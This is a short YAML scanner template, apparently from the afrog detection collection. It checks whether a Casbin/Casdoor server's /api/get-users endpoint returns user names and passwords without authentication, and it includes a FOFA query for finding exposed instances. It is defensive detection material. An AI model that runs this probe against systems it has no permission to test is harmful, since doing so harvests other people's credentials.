# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"name":'
          - '"password":'
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/api/get-users?p=123&pageSize=123'
id: casbin-get-users-account-password-disclosure
info:
  author: daffainfo
  description: |
    Casbin get-users api接口存在账号密码泄漏漏洞，攻击者通过漏洞可以获取用户敏感信息
    fofa: title="Casdoor"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Casbin get-users 账号密码泄漏漏洞
  severity: high
  tags: casbin,get-users,account-password-disclosure,argus-import
